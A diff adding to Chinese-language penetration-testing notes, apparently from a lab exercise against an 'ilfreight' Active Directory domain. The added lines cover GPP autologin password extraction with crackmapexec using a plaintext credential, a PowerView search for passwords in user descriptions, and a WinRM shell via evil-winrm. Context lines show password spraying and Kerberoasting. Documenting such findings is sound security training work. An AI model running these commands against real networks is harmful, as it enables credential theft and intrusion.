@@ -405,6 +405,8 @@ smb: \IT\Private\Development\> get "SQL Express Backup.ps1"
 无对应账户，可能只是旧密码，可以密码喷洒
 C:\DotNetNuke\Portals\0> Invoke-DomainPasswordSpray -Password Welcome1
 没有有趣的访问权限，仍值得记录名为 Weak Active Directory Passwords（允许使用弱活动目录密码）
+访问域控制器的 SYSVOL 共享目录，在其中搜索 registry.xml 文件，目的是提取组策略首选项（GPP）里可能明文保存的自动登录用户名和密码
+proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin      -M 执行指定模块
 
 Kerberoasting
 C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1
@@ -412,4 +414,11 @@ C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN |Select samaccountname      查 S
 C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation      下载哈希成 csv
 hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt      破解
 该帐户似乎没什么帮助，仍然可以记录下名为 Weak Kerberos Authentication Configuration (Kerberoasting)（弱 Kerberos 身份验证配置 (Kerberoasting)）
+
+C:\DotNetNuke\Portals\0> Get-DomainUser * |select samaccountname,description | ?{$_.Description -ne $null}      在 description 找密码
+可以记录名为 Passwords in AD User Description Field（AD 用户描述字段中存在密码）
+
+上面用完 RDP，下面尝试 WinRM
+proxychains nmap -sT -p 5985 172.16.8.50      看有无 WinRM
+proxychains evil-winrm -i 172.16.8.50 -u backupadm      尝试用之前得到的账户，得到 shell
 
